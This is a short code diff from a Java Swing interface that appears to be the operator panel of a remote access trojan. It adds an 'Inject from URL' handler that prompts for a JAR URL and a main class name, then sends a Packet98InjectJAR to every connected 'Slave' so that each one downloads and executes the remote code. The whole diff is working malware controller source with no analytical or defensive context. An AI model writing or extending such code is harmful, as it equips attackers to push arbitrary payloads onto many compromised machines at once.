@@ -1397,13 +1397,35 @@ public class Frame extends BaseFrame {
 		mntmRunCommand.setIcon(new ImageIcon(Frame.class.getResource("/icons/runcmd.png")));
 		popupMenu.add(mntmRunCommand);
 		
-		JMenu mnInject = new JMenu("Inject");
+		JMenu mnInject = new JMenu("Inject JAR");
 		mnInject.setIcon(new ImageIcon(Frame.class.getResource("/icons/inject.png")));
 		popupMenu.add(mnInject);
 		
 		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
 		mntmInjectFromUrl.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
+				List<Slave> servers = Utils.getSlaves();
+				if (servers.size() > 0) {
+					String url;
+					
+					url = Utils.showDialog("Inject from URL", "Type file URL");
+					
+					if (url == null || url != null && url.length() == 0) {
+						return;
+					}
+					
+					String mainClass;
+					
+					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");
+
+					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
+						return;
+					}
+					
+					for (Slave slave : servers) {
+						slave.addToSendQueue(new Packet98InjectJAR(url, mainClass));
+					}
+				}
 			}
 		});
 		mntmInjectFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
